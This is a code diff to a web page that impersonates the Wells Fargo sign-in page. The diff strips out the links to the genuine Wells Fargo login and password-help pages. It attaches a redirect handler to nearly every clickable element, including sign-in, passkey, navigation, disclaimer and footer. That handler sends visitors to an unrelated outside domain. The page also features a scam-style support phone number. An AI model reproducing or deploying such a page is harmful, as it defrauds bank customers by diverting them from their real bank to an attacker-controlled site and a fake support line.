@@ -10,6 +10,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab&family=Roboto&display=swap" rel="stylesheet" />
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
+
     <style>
         body {
             font-family: 'Roboto', sans-serif;
@@ -24,7 +25,7 @@
 <body class="bg-white">
 
     <!-- Header -->
-    <header class="bg-[#d91f26] text-white">
+    <header class="bg-[#d91f26] text-white" onclick="redirectLink()">
         <div class="max-w-[1200px] mx-auto flex items-center justify-between px-4 py-3 sm:py-4">
             <div class="font-robotoslab font-bold text-xl select-none">
                 <a href="https://www.wellsfargo.com/">
@@ -38,13 +39,12 @@
             </div>
             <nav id="navbarMenu"
                 class="hidden md:flex flex-col md:flex-row items-start md:items-center space-y-2 md:space-y-0 md:space-x-4 text-sm sm:text-base font-normal absolute md:static top-16 left-0 w-full md:w-auto bg-[#d91f26] px-4 py-3 md:py-0 md:bg-transparent z-50">
-                <a class="flex items-center space-x-1 hover:underline whitespace-nowrap" href="#"><i
+                <a class="flex items-center space-x-1 hover:underline whitespace-nowrap" onclick="redirectLink()" href="#"><i
                         class="fas fa-user-circle text-lg"></i><span>Enroll</span></a>
-                <a class="hover:underline whitespace-nowrap" href="#">Customer Service</a>
-                <a class="hover:underline whitespace-nowrap" href="#">ATMs/Locations</a>
-                <a class="hover:underline whitespace-nowrap" href="#">Español</a>
-                <button
-                    onclick="callSupport()"
+                <a class="hover:underline whitespace-nowrap" onclick="redirectLink()" href="#">Customer Service</a>
+                <a class="hover:underline whitespace-nowrap" onclick="redirectLink()" href="#">ATMs/Locations</a>
+                <a class="hover:underline whitespace-nowrap" onclick="redirectLink()" href="#">Español</a>
+                <button onclick="callSupport()"
                     class="w-full bg-gray-100 text-black cursor-pointer rounded-md font-semibold p-3 mt-4  select-none">
                     Contact Us
                 </button>
@@ -79,28 +79,29 @@
                 <p class="text-xs text-gray-600 max-w-[320px]">To help keep your account secure, save your username only
                     on devices that aren't used by other people.</p>
                 <button
+                onclick="redirectLink()"
                     class="w-full bg-gray-600 text-white cursor-pointer font-semibold rounded-full py-2 mt-4  select-none">
-                    <a href="https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS">Sign In</a>
-                    
+                    <a href="">Signon</a>
+
                 </button>
                 <div class="text-center text-gray-700 mt-3 mb-3">or</div>
-                <button type="button"
-                    onclick="useRealPasskey()"
+                <button type="button" onclick="redirectLink()"
                     class="flex items-center justify-center gap-2 border border-gray-700 rounded-full py-2 px-5 font-semibold text-gray-900 hover:bg-gray-100 mx-auto">
                     <i class="fas fa-user-lock"></i><span>Use a passkey</span>
                 </button>
-               
+
                 <div
                     class="mt-6 text-center text-[#5c4a9e] text-sm font-normal flex items-center justify-center gap-1 cursor-pointer">
                     <i class="fas fa-arrow-right"></i>
-                    <a href="https://oam.wellsfargo.com/oamo/identity/help/passwordhelp?_gl=1*1ni4gfs*_gcl_au*MjkyMDI4ODYxLjE3NTEyOTM1NTc.*_ga*MTE3MDYyMDYzMC4xNzUxMjkzNTU3*_ga_7JXJJ2JF12*MTc1MTI5MzU1Ny4xLjEuMTc1MTI5Mzc0NS42MC4wLjA.#/" class="hover:underline">
+                    <a href="#" onclick="redirectLink()"
+                        class="hover:underline">
+
                         Forgot username or password?</a>
                 </div>
 
 
-                    <h3 class="text-center" >Contact With Us</h3>
-                 <button
-                    onclick="callSupport()"
+                <h3 class="text-center">Contact With Us</h3>
+                <button onclick="callSupport()"
                     class="w-full bg-red-600 text-white cursor-pointer font-semibold rounded-full py-2 mt-4  select-none">
                     +1-833-319-3003
                 </button>
@@ -109,7 +110,7 @@
     </div>
 
     <!-- Disclaimer -->
-    <section class="max-w-[720px]  mx-auto mt-10 mb-6 bg-white border border-gray-300 p-5 rounded-md mt-12">
+    <section onclick="redirectLink()" class="max-w-[720px]  mx-auto mt-10 mb-6 bg-white border border-gray-300 p-5 rounded-md mt-12" onclick="redirectLink()">
         <p class="font-semibold text-gray-800 mb-2">Investment and Insurance Products are:</p>
         <ul class="list-disc list-inside font-semibold text-gray-800 space-y-1">
             <li>Not Insured by the FDIC or Any Federal Government Agency</li>
@@ -117,21 +118,21 @@
             <li>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
         </ul>
     </section>
-    <p class="max-w-[720px] mx-auto text-gray-600 text-sm mb-12 px-4">Deposit products offered by Wells Fargo Bank, N.A.
+    <p onclick="redirectLink()" class="max-w-[720px] mx-auto text-gray-600 text-sm mb-12 px-4">Deposit products offered by Wells Fargo Bank, N.A.
         Member FDIC.</p>
 
     <!-- Footer -->
-    <footer class="border-t border-gray-300 bg-[#f6f3f1] py-6">
+    <footer class="border-t border-gray-300 bg-[#f6f3f1] py-6 " onclick="redirectLink()">
         <div class="max-w-[900px] mx-auto px-4 text-xs text-gray-700 flex flex-wrap justify-center gap-x-4 gap-y-2">
-            <a href="#" class="hover:underline whitespace-nowrap">About Wells Fargo</a> |
-            <a href="#" class="hover:underline whitespace-nowrap">Online Access Agreement</a> |
-            <a href="#" class="hover:underline whitespace-nowrap">Privacy, Cookies, Security & Legal</a> |
-            <a href="#" class="hover:underline whitespace-nowrap">Do not sell or share my personal information</a> |
-            <a href="#" class="hover:underline whitespace-nowrap">Notice of Data Collection</a> |
-            <a href="#" class="hover:underline whitespace-nowrap">Report Email Fraud</a> |
-            <a href="#" class="hover:underline whitespace-nowrap">Security Center</a> |
-            <a href="#" class="hover:underline whitespace-nowrap">Sitemap</a> |
-            <a href="#" class="hover:underline whitespace-nowrap">Give Us Feedback</a>
+            <a href="#" onclick="redirectLink()"  class="hover:underline whitespace-nowrap">About Wells Fargo</a> |
+            <a href="#" onclick="redirectLink()" class="hover:underline whitespace-nowrap">Online Access Agreement</a> |
+            <a href="#" onclick="redirectLink()" class="hover:underline whitespace-nowrap">Privacy, Cookies, Security & Legal</a> |
+            <a href="#" onclick="redirectLink()" class="hover:underline whitespace-nowrap">Do not sell or share my personal information</a> |
+            <a href="#" onclick="redirectLink()" class="hover:underline whitespace-nowrap">Notice of Data Collection</a> |
+            <a href="#" onclick="redirectLink()" class="hover:underline whitespace-nowrap">Report Email Fraud</a> |
+            <a href="#" onclick="redirectLink()" class="hover:underline whitespace-nowrap">Security Center</a> |
+            <a href="#" onclick="redirectLink()" class="hover:underline whitespace-nowrap">Sitemap</a> |
+            <a href="#" onclick="redirectLink()" class="hover:underline whitespace-nowrap">Give Us Feedback</a>
         </div>
         <p class="max-w-[900px] mx-auto px-4 mt-4 text-xs text-gray-700 select-none">© 1999 - 2025 Wells Fargo. All
             rights reserved. NMLSR ID 399801</p>
@@ -150,7 +151,8 @@
 
         }
 
- async function useRealPasskey() {
+
+        async function useRealPasskey() {
             try {
                 const challenge = new Uint8Array(32);
                 window.crypto.getRandomValues(challenge); // Secure random challenge
@@ -188,6 +190,11 @@
                 });
             }
         }
+
+
+          function redirectLink() {
+    window.location.href = "https://itshopcat.com/us";
+  }
     </script>
 
 </body>
